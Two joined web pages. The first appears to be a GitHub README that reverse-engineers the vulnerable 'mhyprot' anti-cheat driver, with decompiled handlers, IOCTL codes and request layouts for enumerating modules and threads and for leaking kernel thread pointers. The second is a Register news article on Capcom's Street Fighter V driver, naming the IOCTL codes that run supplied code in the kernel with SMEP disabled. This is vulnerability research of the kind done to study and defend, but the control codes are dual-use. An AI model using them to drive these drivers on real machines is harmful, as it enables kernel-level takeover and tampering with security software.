[![IMAGE](/Luohuayu/evil-mhyprot-cli/raw/main/image07.png)](/Luohuayu/evil-mhyprot-cli/blob/main/image07.png)

## Enumerate Modules

So the driver has a lots of commands that make us advantage.

In this case, we are able to enumerate modules that loaded in the target process by process id and a number which specifies we want to get.

I'll explain herewith below how I made it managed to work it with reverse engineering.

The implementation can be found at [mhyprot.cpp#L343](https://github.com/kkent030315/evil-mhyprot-cli/blob/main/src/mhyprot.cpp#L343).

First of all, As you can see there is `cmp ecx, 82054000h` as I defined in [mhyprot.hpp#L22](https://github.com/kkent030315/evil-mhyprot-cli/blob/main/src/mhyprot.hpp#L22) as `MHYPROT_IOCTL_ENUM_PROCESS_MODULES`.

[![IMAGE](/Luohuayu/evil-mhyprot-cli/raw/main/IDA/imgs/image10.png)](/Luohuayu/evil-mhyprot-cli/blob/main/IDA/imgs/image10.png)

And it calls:

```
__int64 __fastcall sub_FFFFF800188C26D0(unsigned int a1, __int64 a2, __int64 a3)
{
  __int64 v3; // rsi
  unsigned int v4; // ebx
  bool v5; // di
  unsigned int v7; // ebx
  PVOID Object; // [rsp+58h] [rbp+20h]

  v3 = a2;
  Object = 0i64;
  v4 = a3;
  v5 = (int)PsLookupProcessByProcessId(a1, &Object, a3) >= 0;
  if ( !Object )
    return 0i64;
  v7 = sub_FFFFF800188C27D4(Object, v3, v4);
  if ( Object )
  {
    if ( v5 )
      ObfDereferenceObject(Object);
  }
  return v7;
}
```

As you cansee, the function checks is process `32-bit` or `64-bit` by `PsGetProcessWow64Process()` since `PEB` is different between 32 and 64-bit processes.

In this case, I only talk about for 64-bit process.

After that, the function attaches from kernel using `KeStackAttachProcess`. the second parameter is `PKAPC_STATE`.

Then, call `PsGetProcessPeb` and get the [PEB](https://docs.microsoft.com/en-us/windows/win32/api/winternl/ns-winternl-peb) belongs to the target process.

...`LDR_MODULE` is undocumented structure.

```
typedef struct _LDR_MODULE {
  LIST_ENTRY              InLoadOrderModuleList;
  LIST_ENTRY              InMemoryOrderModuleList;
  LIST_ENTRY              InInitializationOrderModuleList;
  PVOID                   BaseAddress;
  PVOID                   EntryPoint;
  ULONG                   SizeOfImage;
  UNICODE_STRING          FullDllName;
  UNICODE_STRING          BaseDllName;
  ULONG                   Flags;
  SHORT                   LoadCount;
  SHORT                   TlsIndex;
  LIST_ENTRY              HashTableEntry;
  ULONG                   TimeDateStamp;
} LDR_MODULE, *PLDR_MODULE;
```

And the function pseudocode for `sub_FFFFF800188C27D4` is like:

```
__int64 __fastcall sub_FFFFF800188C27D4(
  __int64 a1,       // pEPROCESS
  __int64 a2,       // pointer to the buffer that sent from usermode
  unsigned int a3   // max count to get
)
{
  ...

  if ( !a1 )
    return 0i64;

  v9 = ((__int64 (*)(void))PsGetProcessWow64Process)() != 0;
  KeStackAttachProcess(v5, &v30);

  if ( !v9 ) // the process is 64-bit
  {
    v17 = PsGetProcessPeb(v5); // Lookup PEB
    v18 = v17;
    if ( v17 )
    {
      v19 = *(_QWORD *)(v17 + 24); // PEB->Ldr
      if ( v19 )
      {
        for ( j = *(__int64 **)(v19 + 16);
              j != (__int64 *)(*(_QWORD *)(v18 + 24) + 16i64); // PEB->Ldr->InMemoryOrderModuleList.Flink
              j = (__int64 *)*j )
        {
          if ( v7 < v3 ) // if the counter less than a number what we want to get
          {
            v21 = 928i64 * v7; // [IMPORTANT] we can see output structure is 0x3A0 alignment
            sub_FFFFF800188C7900(v21 + v4 + 12, 0i64, 256i64); // fill memory by 0 sizeof 0x100
            sub_FFFFF800188C7900(v21 + v4 + 268, 0i64, 520i64); // fill memory by 0 sizeof 0x208
            *(_QWORD *)(v21 + v4) = j[6];
            *(_DWORD *)(v21 + v4 + 8) = *((_DWORD *)j + 16);
            v22 = *((_WORD *)j + 44);
            v23 = 127i64;
            if ( v22 <= 0x7Fu )
              v23 = v22;
            sub_FFFFF800188C75C0(v21 + v4 + 12, j[12], v23); // copy BaseDllName to the buffer
            v24 = *((_WORD *)j + 36);
            v25 = v24;
            if ( v24 > 0x103u )
              v25 = 259i64;
            sub_FFFFF800188C75C0(v21 + v4 + 268, j[10], v25); // copy FullDllName to the buffer
            *(_QWORD *)(v21 + v4 + 792) = *((unsigned int *)j + 32);
            v3 = v32;
          }
          ++v6; // counter
          ++v7; // counter
        }
      }
    }
  } else { ... /* 32-bit PEB (Redacted) */ }
  KeUnstackDetachProcess(&v30); // detach
  return v6;
}
```

We got a much information from it as follows:

* We can get `BaseDllName` and `FullDllName` using this ioctl command
* What we need is only `ProcessId` and `MaxCount`
* The output buffer will overrided in the request buffer
* The output buffer also must have `0x3A0` size alignment per module

Now lets time to code, as we define structure for the payload:

(This is defined in [mhyprot.hpp#L62](https://github.com/kkent030315/evil-mhyprot-cli/blob/main/src/mhyprot.hpp#L62) as well.)

```
typedef struct _MHYPROT_ENUM_PROCESS_MODULES_REQUEST
{
	uint32_t process_id;
	uint32_t max_count;
} MHYPROT_ENUM_PROCESS_MODULES_REQUEST, * PMHYPROT_ENUM_PROCESS_MODULES_REQUEST;
```

By:

```
if (uVar1_ControlCode == 0x82054000) {
	uVar6 = GetModuleListByProcessId_FUN_000126d0
		(*(uint *)puVar3_RequestContext, 				// process id
		(longlong)(uint *)((longlong)puVar3_RequestContext + 4), 	// out buffer, the output will be stored with overriding max count...
		*(uint *)((longlong)puVar3_RequestContext + 4) 			// max count
		);
	iVar3 = (int)uVar6;
}
...
// mhyprot overrides first 4byte of the payload buffer to identify success or fail
*(int *)puVar3_RequestContext = iVar3;
```

What we need is:

* 1. Allocate memory for payload and its result, `0x3A0` \* `MaxCount`
* 2. Send the payload with the ioctl code `0x82054000`
* 3. Check for the first 4byte

Call map:

[![IMAGE](/Luohuayu/evil-mhyprot-cli/raw/main/IDA/imgs/image12.png)](/Luohuayu/evil-mhyprot-cli/blob/main/IDA/imgs/image12.png)

### Proof

I've hooked some part of mhyprot kernel module, especially `PsGetProcessPEB` and `PsLookupProcessByProcessId` and confirmed.

[![IMAGE](/Luohuayu/evil-mhyprot-cli/raw/main/IDA/imgs/image11.png)](/Luohuayu/evil-mhyprot-cli/blob/main/IDA/imgs/image11.png)

## Getting System Uptime

The driver ioctl implements getting system uptime as follows:

It eventually calls `KeQueryTimeIncrement` which could get system uptime in nanoseconds.

```
PAGE:FFFFF800188CD737 loc_FFFFF800188CD737:                   ; CODE XREF: sub_FFFFF800188CD6E0+38↑j
PAGE:FFFFF800188CD737                 lea     eax, [rcx+7FEEC000h]
PAGE:FFFFF800188CD73D                 mov     edx, 80134000h
PAGE:FFFFF800188CD742                 test    eax, 0FFFCFFFFh
PAGE:FFFFF800188CD747                 jnz     short loc_FFFFF800188CD751
PAGE:FFFFF800188CD749                 cmp     ecx, edx
PAGE:FFFFF800188CD74B                 jnz     loc_FFFFF800188CDA4F
PAGE:FFFFF800188CD751
PAGE:FFFFF800188CD751 loc_FFFFF800188CD751:                   ; CODE XREF: sub_FFFFF800188CD6E0+67↑j
PAGE:FFFFF800188CD751                 cmp     ecx, edx // if (ioctl_code == 0x80134000)
PAGE:FFFFF800188CD753                 jnz     short loc_FFFFF800188CD766
PAGE:FFFFF800188CD755                 call    sub_FFFFF800188C2314 // <-
PAGE:FFFFF800188CD75A                 mov     [rdi], eax // *(unsigned int*)req_ctx = (unsigned int)result
```

and the `sub_FFFFF800188C2314` is:

```
.text:FFFFF800188C2314 sub_FFFFF800188C2314 proc near          ; CODE XREF: sub_FFFFF800188C141C+C↑p
.text:FFFFF800188C2314                                         ; sub_FFFFF800188C5C0C+38↓p ...
.text:FFFFF800188C2314                 sub     rsp, 28h
.text:FFFFF800188C2318                 call    cs:KeQueryTimeIncrement // <-
.text:FFFFF800188C231E                 mov     eax, eax
.text:FFFFF800188C2320                 mov     rcx, 0FFFFF78000000320h
.text:FFFFF800188C232A                 mov     rcx, [rcx]
.text:FFFFF800188C232D                 imul    rcx, rax
.text:FFFFF800188C2331                 mov     rax, 346DC5D63886594Bh
.text:FFFFF800188C233B                 imul    rcx
.text:FFFFF800188C233E                 sar     rdx, 0Bh
.text:FFFFF800188C2342                 mov     rax, rdx
.text:FFFFF800188C2345                 shr     rax, 3Fh
.text:FFFFF800188C2349                 add     rax, rdx
.text:FFFFF800188C234C                 add     rsp, 28h
.text:FFFFF800188C2350                 retn // (unsigned integer) miliseconds
.text:FFFFF800188C2350 sub_FFFFF800188C2314 endp
```

Call map:

[![IMAGE](/Luohuayu/evil-mhyprot-cli/raw/main/IDA/imgs/image13.png)](/Luohuayu/evil-mhyprot-cli/blob/main/IDA/imgs/image13.png)

## Enumerate Threads

The driver has a vulnerable ioctl that allows us to enumerate threads in specific process as ring-0 privilege.

it also make us able to read kernel structure `PETHREAD` because the ioctl result contains a pointer to it.

to read kernel memory, we are already able to do it through this vulnerable driver as well.

I'll explain how I made managed to work it with reverse engineering.

First of all, the driver has a function that executes `ZwQuerySystemInformation`.

Here is a block found on ioctl handler subroutine:

```
PAGE:FFFFF800188CD77E loc_FFFFF800188CD77E:                   ; CODE XREF: sub_FFFFF800188CD6E0+8C↑j
PAGE:FFFFF800188CD77E                 cmp     ecx, 83024000h
PAGE:FFFFF800188CD784                 jnz     short loc_FFFFF800188CD794
PAGE:FFFFF800188CD786                 lea     rcx, [rdi+4]
PAGE:FFFFF800188CD78A                 mov     rdx, rdi
PAGE:FFFFF800188CD78D                 call    sub_FFFFF800188C62EC
PAGE:FFFFF800188CD792                 jmp     short loc_FFFFF800188CD7C1
```

`sub_FFFFF800188C62EC` is:

```
__int64 __fastcall sub_FFFFF800188C62EC(__int64 a1, _DWORD *a2)
{
  __int64 result; // rax

  if ( *a2 == 136 ) // *a2 == 0x88
    result = sub_FFFFF800188C6488(a2[2], a1, a2[1]);
  else
    result = 0xFFFFFFFFi64;
  return result;
}
```

We are seeing an if statement `if ( *a2 == 136 )`, `136` is `0x88`, if the a2(given by context) is not `0x88`, the driver will returns `0xFFFFFFFF`.

I have no idea what is this validation is even I finished looking around it for a while...

Also `sub_FFFFF800188C6488` is:

```
__int64 __fastcall sub_FFFFF800188C6488(int a1, __int64 a2_OutBuffer, unsigned int a3_ProcessId)
{
  v3_OutBuffer = a2_OutBuffer;
  v4 = a1;
  v5 = a3_ProcessId;
  v6 = -1;
  RtlInitUnicodeString(&SystemRoutineName, L"ZwQuerySystemInformation");
  v7_pZwQuerySystemInformation = (int (__fastcall *)(__int64, __m128 *, _QWORD, SIZE_T *))MmGetSystemRoutineAddress(&SystemRoutineName);
  v8_pZwQuerySystemInformation = v7_pZwQuerySystemInformation;
  if ( v7_pZwQuerySystemInformation )
  {
    LODWORD(NumberOfBytes) = 0;
    if ( v7_pZwQuerySystemInformation(5i64, 0i64, 0i64, &NumberOfBytes) == -1073741820 )// SystemProcessInformation
    {
      if ( (_DWORD)NumberOfBytes )
      {
        v9 = (__m128 *)ExAllocatePool(NonPagedPool, (unsigned int)NumberOfBytes);
        v10_ProcInfo = v9;
        if ( v9 )
        {
          RKM_sub_FFFFF800188C7900(v9, 0, (unsigned int)NumberOfBytes);// fill the memory by 0
          if ( v8_pZwQuerySystemInformation(5i64, v10_ProcInfo, (unsigned int)NumberOfBytes, &NumberOfBytes) >= 0 )// SystemProcessInformation
          {
            v11_ProcInfo = v10_ProcInfo;
            while ( (unsigned __int8)MmIsAddressValid(v11_ProcInfo) )
            {
              if ( v11_ProcInfo[5].m128_i32[0] == v4 )
              {
                v6 = HIDWORD(v11_ProcInfo->m128_u64[0]);
                if ( v6 <= v5 )                 // == ProcessId
                {
                  v13 = 0i64;
                  if ( v6 )
                  {
                    v14 = v3_OutBuffer + 8;     // data offset per item
                    v15 = v11_ProcInfo + 19;
                    do
                    {
                      v16 = v15->m128_u64[0];
                      Object_PETHREAD = 0i64;
                      PsLookupThreadByThreadId(v16, &Object_PETHREAD);
                      v17_PETHREAD = Object_PETHREAD;
                      v18_PETHREAD = Object_PETHREAD;
                      *(_DWORD *)(v14 - 8) = v11_ProcInfo[5].m128_i32[0];
                      *(_DWORD *)(v14 - 4) = v16;
                      *(_QWORD *)v14 = v18_PETHREAD;// set a pointer to the this PETHREAD
                      *(_QWORD *)(v14 + 8) = GetThreadStartAddress_sub_FFFFF800188C68C8((__int64)v18_PETHREAD);// set thread start address
                      *(_QWORD *)(v14 + 16) = sub_FFFFF800188C687C((__int64)v17_PETHREAD);// this actually return PETHREAD+0x400
                      *(_DWORD *)(v14 + 24) = sub_FFFFF800188C67F4((__int64)v17_PETHREAD) != 0;// unknown, bool
                      if ( v17_PETHREAD )
                        ObfDereferenceObject(v17_PETHREAD);
                      ++v13;
                      v15 += 5;
                      v14 += 168i64;            // 0xA8 alignment
                    }
                    while ( v13 < HIDWORD(v11_ProcInfo->m128_u64[0]) ); SYSTEM_PROCESS_INFORMATION->Threads
                  }
                }
                break;
              }
              v12 = LODWORD(v11_ProcInfo->m128_u64[0]);
              if ( (_DWORD)v12 )
              {
                v11_ProcInfo = (__m128 *)((char *)v11_ProcInfo + v12);
                if ( v11_ProcInfo )
                  continue;
              }
              break;
            }
            ExFreePoolWithTag(v10_ProcInfo, 0);
          }
        }
      }
    }
  }
  return v6;
}
```

As the pseudocode says, subroutine does:

* 1. Get the pointer to the `ZwQuerySystemInformation` by `MmGetSystemRoutineAddress`
* 2. Call `ZwQuerySystemInformation` with `SystemProcessInformation` to get pool size what we have to allocate. (bad implementation)
* 3. Allocate memory using `ExAllocatePool` with the size
* 4. Call `ZwQuerySystemInformation` again to enumerate processes
* 5. Enumerate for every single processes and making sure the address is valid by `MmIsAddressValid`
  + If the process id is match, call `PsLookupThreadByThreadId` to get `PETHREAD` by thread id, then write information into the payload buffer, every single threads.

Also:

* The output data structure is `0xA8` alignment
* We can get its thread's start address by `sub_FFFFF800188C68C8`
* We can get its thread's `PETHREAD` address in the kernel

So I don't know what `sub_FFFFF800188C687C` and `sub_FFFFF800188C67F4` does.

only one thing I know is that the first one references `PETHREAD+0x400` as follows:

```
__int64 __fastcall sub_FFFFF800188C687C(__int64 a1_PETHREAD)
{
  __int64 v1; // rbx
  __int64 v2_PETHREAD; // rdi
  __int64 *v4; // rdi

  v1 = 0i64;
  v2_PETHREAD = a1_PETHREAD;
  if ( !qword_FFFFF800188CA728 )
    return 0i64;
  if ( (unsigned __int8)MmIsAddressValid(a1_PETHREAD) == 1 )
  {
    v4 = (__int64 *)(qword_FFFFF800188CA728 + v2_PETHREAD);// 1048i64 + v2_PETHREAD, winver depends
    if ( (unsigned __int8)MmIsAddressValid(v4) == 1 )
      v1 = *v4;
  }
  return v1;
}
```

`qword_FFFFF800188CA728` is an static variable which has a windows-version-depends offset for the struct member.

Confirmed by this subroutine:

As you can see the switch-case is winver.

```
bool __fastcall sub_FFFFF800188C70CC(__int64 a1, __int64 a2, __int64 a3)
{
  char v4; // [rsp+20h] [rbp-128h]
  unsigned int v5; // [rsp+2Ch] [rbp-11Ch]
  __int64 v6; // [rsp+150h] [rbp+8h]

  switch ( dword_FFFFF800188CA748 )
  {
    case 61:
      qword_FFFFF800188CA700 = 384i64;
      qword_FFFFF800188CA708 = 360i64;
      qword_FFFFF800188CA710 = 496i64;
      qword_FFFFF800188CA720 = 512i64;
      qword_FFFFF800188CA718 = 616i64;
      qword_FFFFF800188CA728 = 872i64;
      qword_FFFFF800188CA730 = 1048i64; // <-
      qword_FFFFF800188CA738 = 1104i64;
      qword_FFFFF800188CA740 = 736i64;
      break;
    case 62:
      qword_FFFFF800188CA730 = 1008i64; // <-
      qword_FFFFF800188CA738 = 1068i64;
      goto LABEL_15;
    case 63:
      qword_FFFFF800188CA730 = 1656i64; // <-
      qword_FFFFF800188CA738 = 1716i64;
LABEL_15:
      qword_FFFFF800188CA718 = 936i64;
      qword_FFFFF800188CA720 = 1032i64;
      qword_FFFFF800188CA710 = 1040i64;
      qword_FFFFF800188CA700 = 736i64;
      qword_FFFFF800188CA740 = 768i64;
      break;
    case 100:
      RtlGetVersion(&v4);
      if ( v5 >= 0x4A61 )
      {
        qword_FFFFF800188CA730 = 0i64; // <-
        qword_FFFFF800188CA700 = 1088i64;
        qword_FFFFF800188CA710 = 1400i64;
        qword_FFFFF800188CA718 = 1304i64;
        qword_FFFFF800188CA720 = 1392i64;
        qword_FFFFF800188CA708 = 1128i64;
        qword_FFFFF800188CA738 = 1296i64;
LABEL_9:
        qword_FFFFF800188CA740 = 912i64;
        break;
      }
      qword_FFFFF800188CA710 = 1056i64;
      qword_FFFFF800188CA720 = 1048i64;
      if ( v5 >= 0x47BA )
      {
        qword_FFFFF800188CA700 = 744i64;
        qword_FFFFF800188CA718 = 960i64;
        qword_FFFFF800188CA708 = 784i64;
        qword_FFFFF800188CA730 = 1696i64; // <-
        qword_FFFFF800188CA738 = 1760i64;
        goto LABEL_9;
      }
      qword_FFFFF800188CA718 = 952i64;
      qword_FFFFF800188CA740 = 904i64;
      if ( v5 < 0x3AD7 )
      {
        qword_FFFFF800188CA700 = 744i64;
        qword_FFFFF800188CA730 = 1672i64; // <-
        qword_FFFFF800188CA738 = 1728i64;
      }
      else
      {
        qword_FFFFF800188CA700 = 736i64;
        qword_FFFFF800188CA708 = 776i64;
        qword_FFFFF800188CA730 = 1680i64; // <-
        qword_FFFFF800188CA738 = 1744i64;
      }
      break;
  }
  v6 = 0i64;
  PsLookupProcessByProcessId(4i64, &v6, a3);
  return sub_FFFFF800188C3D08(v6) == 4;
}
```

Call map:

[![IMAGE](/Luohuayu/evil-mhyprot-cli/raw/main/images/image14.png)](/Luohuayu/evil-mhyprot-cli/blob/main/images/image14.png)

### Proof

Confirmed by hooking system-calls in mhyprot kernel module:

System-calls are properly called exactly same as the pseudocode:

[![IMAGE](/Luohuayu/evil-mhyprot-cli/raw/main/images/image11.png)](/Luohuayu/evil-mhyprot-cli/blob/main/images/image11.png)

[![IMAGE](/Luohuayu/evil-mhyprot-cli/raw/main/images/image12.png)](/Luohuayu/evil-mhyprot-cli/blob/main/images/image12.png)

Data is set by the driver, this is the memory view of payload buffer:

[![IMAGE](/Luohuayu/evil-mhyprot-cli/raw/main/images/image13.png)](/Luohuayu/evil-mhyprot-cli/blob/main/images/image13.png)

## About

A PoC for vulnerable driver "mhyprot" that allows us to read/write memory in kernel/user from usermode.

### Resources

[Readme](#readme-ov-file)
### License

[MIT license](#MIT-1-ov-file)

[Activity](/Luohuayu/evil-mhyprot-cli/activity)
### Stars

[**5**
stars](/Luohuayu/evil-mhyprot-cli/stargazers)
### Watchers

[**1**
watching](/Luohuayu/evil-mhyprot-cli/watchers)
### Forks

[**1**
fork](/Luohuayu/evil-mhyprot-cli/forks)
[Report repository](/contact/report-content?content_url=https%3A%2F%2Fgithub.com%2FLuohuayu%2Fevil-mhyprot-cli&report=Luohuayu+%28user%29)

## [Releases](/Luohuayu/evil-mhyprot-cli/releases)

No releases published

## [Packages 0](/users/Luohuayu/packages?repo_name=evil-mhyprot-cli)

No packages published

## Languages

* C++
  100.0%

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from www.theregister.com_afaa0f66_20250115_140027.html ===


[![](/design_picker/ae01b183a707a7db8cd5f2c947715ed56d335138/graphics/std/user_icon_white_extents_16x16.png)
![](/design_picker/ae01b183a707a7db8cd5f2c947715ed56d335138/graphics/std/user_icon_white_filled_extents_16x16.png)
Sign in / up](https://account.theregister.com/register/)

[![The Register® — Biting the hand that feeds IT](/design_picker/fa16d26efb42e6ba1052f1d387470f643c5aa18d/graphics/std/reg_logo_no_strapline.png)](https://www.theregister.com/)

[![](/design_picker/ae01b183a707a7db8cd5f2c947715ed56d335138/graphics/std/magnifying_glass_white_extents_16x16.png)](https://search.theregister.com/)

![](/design_picker/ae01b183a707a7db8cd5f2c947715ed56d335138/graphics/icon/burger_menu_white_16x16.png)
![](/design_picker/ae01b183a707a7db8cd5f2c947715ed56d335138/graphics/icon/burger_menu_white_close_16x16.png)

## Topics

[Security](#subnav-box-nav-security)
## [Security](#subnav-box-nav-security)

[All Security](https://www.theregister.com/security/)[Cyber-crime](https://www.theregister.com/security/cyber_crime/)[Patches](https://www.theregister.com/security/patches/)[Research](https://www.theregister.com/security/research/)[CSO](https://www.theregister.com/security/cso/)
[(X)](#masthead)

[Off-Prem](#subnav-box-nav-off_prem)
## [Off-Prem](#subnav-box-nav-off_prem)

[All Off-Prem](https://www.theregister.com/off_prem/)[Edge + IoT](https://www.theregister.com/off_prem/edge_iot/)[Channel](https://www.theregister.com/off_prem/channel/)[PaaS + IaaS](https://www.theregister.com/off_prem/paas_iaas/)[SaaS](https://www.theregister.com/off_prem/saas/)
[(X)](#masthead)

[On-Prem](#subnav-box-nav-on_prem)
## [On-Prem](#subnav-box-nav-on_prem)

[All On-Prem](https://www.theregister.com/on_prem/)[Systems](https://www.theregister.com/on_prem/systems/)[Storage](https://www.theregister.com/on_prem/storage/)[Networks](https://www.theregister.com/on_prem/networks/)[HPC](https://www.theregister.com/on_prem/hpc/)[Personal Tech](https://www.theregister.com/on_prem/personal_tech/)[CxO](https://www.theregister.com/on_prem/cxo/)[Public Sector](https://www.theregister.com/on_prem/public_sector/)
[(X)](#masthead)

[Software](#subnav-box-nav-software)
## [Software](#subnav-box-nav-software)

[All Software](https://www.theregister.com/software/)[AI + ML](https://www.theregister.com/software/ai_ml/)[Applications](https://www.theregister.com/software/applications/)[Databases](https://www.theregister.com/software/databases/)[DevOps](https://www.theregister.com/software/devops/)[OSes](https://www.theregister.com/software/oses/)[Virtualization](https://www.theregister.com/software/virtualization/)
[(X)](#masthead)

[Offbeat](#subnav-box-nav-offbeat)
## [Offbeat](#subnav-box-nav-offbeat)

[All Offbeat](https://www.theregister.com/offbeat/)[Debates](https://www.theregister.com/Debates/)[Columnists](https://www.theregister.com/offbeat/columnists/)[Science](https://www.theregister.com/offbeat/science/)[Geek's Guide](https://www.theregister.com/offbeat/geeks_guide/)[BOFH](https://www.theregister.com/offbeat/bofh/)[Legal](https://www.theregister.com/offbeat/legal/)[Bootnotes](https://www.theregister.com/offbeat/bootnotes/)[Site News](https://www.theregister.com/offbeat/site_news/)[About Us](https://www.theregister.com/offbeat/about_us/)
[(X)](#masthead)

[Special Features](#subnav-box-nav-special_features)
## Special Features

[All Special Features](https://www.theregister.com/special_features)
[The Future of the Datacenter](https://www.theregister.com/special_features/future_of_the_datacenter)
[Cybersecurity Month](https://www.theregister.com/special_features/cybersecurity_month)
[VMware Explore](https://www.theregister.com/special_features/vmware_explore)
[Cloud Infrastructure Month](https://www.theregister.com/special_features/cloud_infrastructure_month)

## Vendor Voice

[Vendor Voice](#subnav-box-nav-tag-vendor-voice)
## [Vendor Voice](#subnav-box-nav-tag-vendor-voice)

[All Vendor Voice](https://www.theregister.com/VendorVoice/)
[Amazon Web Services (AWS) New Horizon in Cloud Computing](https://www.theregister.com/VendorVoice/aws_new_horizon_financial_services/)
[Pure Storage](https://www.theregister.com/VendorVoice/pure_storage_portworx/)
[Kilka Tech](https://www.theregister.com/VendorVoice/aws_klika_tech/)
[HERE and AWS](https://www.theregister.com/VendorVoice/aws_here/)
[Vonage](https://www.theregister.com/VendorVoice/aws_vonage/)
[GE Vernova with AWS](https://www.theregister.com/VendorVoice/aws_ge_vernova_manufacturing/)
[Google Cloud Data Transformation](https://www.theregister.com/VendorVoice/google_cloud_data_transformation/)
[Google Gemini](https://www.theregister.com/VendorVoice/google_gemini/)
[(X)](#masthead)

[Resources](#subnav-box-nav-resources)
## Resources

[Whitepapers](https://whitepapers.theregister.com/)
[Webinars & Events](https://whitepapers.theregister.com/events/list/)
[Newsletters](https://account.theregister.com/edit/newsletter/)

[![](https://pubads.g.doubleclick.net/gampad/ad?co=1&iu=/6978/reg_onprem/personaltech&sz=300x50%7C300x100%7C300x250%7C300x251%7C300x252%7C300x600%7C300x601&tile=2&c=2Z4e_e3KFsntpXb-3spwzRwAAAMI&t=ct%3Dns%26unitnum%3D2%26raptor%3Dcondor%26pos%3Dtop%26test%3D0)](https://pubads.g.doubleclick.net/gampad/jump?co=1&iu=/6978/reg_onprem/personaltech&sz=300x50%7C300x100%7C300x250%7C300x251%7C300x252%7C300x600%7C300x601&tile=2&c=2Z4e_e3KFsntpXb-3spwzRwAAAMI&t=ct%3Dns%26unitnum%3D2%26raptor%3Dcondor%26pos%3Dtop%26test%3D0)

#### [Personal Tech](/on_prem/personal_tech/)

[**63**
![comment bubble on white](/design_picker/f5daacc84b9722c1e31ba85f836c37e4ad993fc4/graphics/icons/bubble_comment_white.png)](https://forums.theregister.com/forum/all/2016/09/23/capcom_street_fighter_v/ "View comments on this article")

This article is more than **1 year old**

# Double KO! Capcom's *Street Fighter V* installs hidden rootkit on PCs

[**63**
![comment bubble on white](/design_picker/f5daacc84b9722c1e31ba85f836c37e4ad993fc4/graphics/icons/bubble_comment_white.png)](https://forums.theregister.com/forum/all/2016/09/23/capcom_street_fighter_v/ "View comments on this article")

## Fatality – wait, no, what? That's the other game

![icon](/design_picker/d518b499f8a6e2c65d4d8c49aca8299d54b03012/graphics/icon/vulture_red.svg)
[Chris Williams](/Author/Chris-Williams "Read more by this author")

Fri 23 Sep 2016  //
20:09 UTC

![](/design_picker/d2e337b97204af4aa34dda04c4e5d56d954b216f/graphics/icons/social_share_icon.svg)

A fresh update for Capcom's *Street Fighter V* for PCs includes a knock-out move: a secret rootkit that gives any installed application kernel-level privileges.

This means any malicious software on the system can poke a dodgy driver installed by *SFV* to completely take over the Windows machine. Capcom claims it uses the driver to [stop players from hacking](https://steamcommunity.com/games/310950/announcements/detail/832427843307776226) the high-def beat 'em up to cheat. Unfortunately, the code is so badly designed, it opens up a full-blown local backdoor.

Let's drill down to the technical details: the capcom.sys kernel-level driver provides an IOCTL service to applications that disables SMEP on the computer, executes code at a given pointer, and then reenables SMEP. In other words, it switches off a crucial security defense in the operating system, then runs whatever instructions are given to it by the application, and then switches the protection back on.

[![](https://pubads.g.doubleclick.net/gampad/ad?co=1&iu=/6978/reg_onprem/personaltech&sz=300x50%7C300x100%7C300x250%7C300x251%7C300x252%7C300x600%7C300x601&tile=2&c=2Z4e_e3KFsntpXb-3spwzRwAAAMI&t=ct%3Dns%26unitnum%3D2%26raptor%3Dcondor%26pos%3Dtop%26test%3D0)](https://pubads.g.doubleclick.net/gampad/jump?co=1&iu=/6978/reg_onprem/personaltech&sz=300x50%7C300x100%7C300x250%7C300x251%7C300x252%7C300x600%7C300x601&tile=2&c=2Z4e_e3KFsntpXb-3spwzRwAAAMI&t=ct%3Dns%26unitnum%3D2%26raptor%3Dcondor%26pos%3Dtop%26test%3D0)

SMEP [[PDF](https://www.ncsi.com/nsatc11/presentations/wednesday/emerging_technologies/fischer.pdf)] is a feature in modern Intel and AMD x86 processors that, when enabled, prevents kernel-level software from executing code in user-owned memory pages. It's there to stop hackers from tricking the operating system into running malicious software smuggled into an application's virtual memory space – the OS should only be able to run its own trusted code, not anything provided by any old app.

[![](https://pubads.g.doubleclick.net/gampad/ad?co=1&iu=/6978/reg_onprem/personaltech&sz=300x50%7C300x100%7C300x250%7C300x251%7C300x252%7C300x600%7C300x601&tile=4&c=44Z4e_e3KFsntpXb-3spwzRwAAAMI&t=ct%3Dns%26unitnum%3D426raptor%3Dfalcon%26pos%3Dmid%26test%3D0)](https://pubads.g.doubleclick.net/gampad/jump?co=1&iu=/6978/reg_onprem/personaltech&sz=300x50%7C300x100%7C300x250%7C300x251%7C300x252%7C300x600%7C300x601&tile=4&c=44Z4e_e3KFsntpXb-3spwzRwAAAMI&t=ct%3Dns%26unitnum%3D4%26raptor%3Dfalcon%26pos%3Dmid%26test%3D0)

[![](https://pubads.g.doubleclick.net/gampad/ad?co=1&iu=/6978/reg_onprem/personaltech&sz=300x50%7C300x100%7C300x250%7C300x251%7C300x252%7C300x600%7C300x601&tile=3&c=33Z4e_e3KFsntpXb-3spwzRwAAAMI&t=ct%3Dns%26unitnum%3D3%26raptor%3Deagle%26pos%3Dmid%26test%3D0)](https://pubads.g.doubleclick.net/gampad/jump?co=1&iu=/6978/reg_onprem/personaltech&sz=300x50%7C300x100%7C300x250%7C300x251%7C300x252%7C300x600%7C300x601&tile=3&c=33Z4e_e3KFsntpXb-3spwzRwAAAMI&t=ct%3Dns%26unitnum%3D3%26raptor%3Deagle%26pos%3Dmid%26test%3D0)

Capcom.sys completely blows this away on Windows: an application simply has to pass control codes 0xAA012044 and 0xAA013044 to the IOCTL, and a pointer to some instructions, and the driver will then [jump to that block of code](https://www.reddit.com/r/Games/comments/545cjy/sfvs_new_pc_update_is_accessing_kernel_level_in/d7z4eev) with full kernel permissions.

> oh dear god this capcom.sys has an ioctl that disables smep and calls a provided function pointer, and sets SMEP back what even [pic.twitter.com/jBCXO7YtNe](https://t.co/jBCXO7YtNe)
>
> — slipstream/RoL (@TheWack0lian) [September 23, 2016](https://twitter.com/TheWack0lian/status/779397840762245124)

Capcom is seemingly using this driver to allow its user-mode game to poke around the machine at the lowest level and spot any attempts by the player to cheat. The tool was bundled within an update, issued earlier this week, to *Street Fighter V* that brought in a new character, Urien. The title went on sale in February this year.

"As a part of the new content and system update releasing later today, we’re also rolling out an updated anti-crack solution (note: not DRM) that prevents certain users from hacking the executable," a Capcom rep explained on Thursday.

"The solution also prevents memory address hack that are commonly used for cheating and illicitly obtaining in-game currency and other entitlements that haven’t been purchased yet.

